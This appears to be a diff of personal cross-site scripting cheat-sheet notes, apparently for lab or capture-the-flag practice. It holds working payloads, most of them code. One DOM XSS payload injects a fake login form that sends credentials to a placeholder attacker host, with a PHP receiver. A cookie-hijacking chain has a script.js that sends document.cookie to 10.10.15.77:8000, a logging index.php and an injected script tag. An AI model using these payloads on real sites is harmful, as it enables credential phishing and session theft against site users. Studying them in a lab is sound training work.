@@ -7,22 +7,19 @@ give it a try for stored xss:
 * `<img src=x onerror=alert(1) />`
 
 typical payload:
-blinkd: ip, cookie, url
+blink: ip, cookie, url
 
-DOM xss payload:
-
+DOM XSS payload:
 ```html
 <img src="" onerror=alert(window.origin)>
 ```
 
 example payload of login form for DOM XSS:
-
 ```javascript
 '><script>document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
 ```
 
 server:
-
 ```php
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
@@ -44,11 +41,14 @@ Common places:
 - Support Tickets
 - HTTP User-Agent header
 
-Example of hijacking cookies:
+#### Example of hijacking cookies:
 
-server:
-
+Run server:
+```php
 php -S 0.0.0.0:8000
+```
+
+`index.php`
 ```php
 <?php
 if (isset($_GET['c'])) {
@@ -62,18 +62,11 @@ if (isset($_GET['c'])) {
 }
 ?>
 ```
-
-
 script.js
-```
-
+```js
 new Image().src='http://10.10.15.77:8000/index.php?c='+document.cookie;
-
 ```
-
-
 payload:
-
 ```
 "><script src=http://10.10.15.77:8000/script.js></script>
 ```
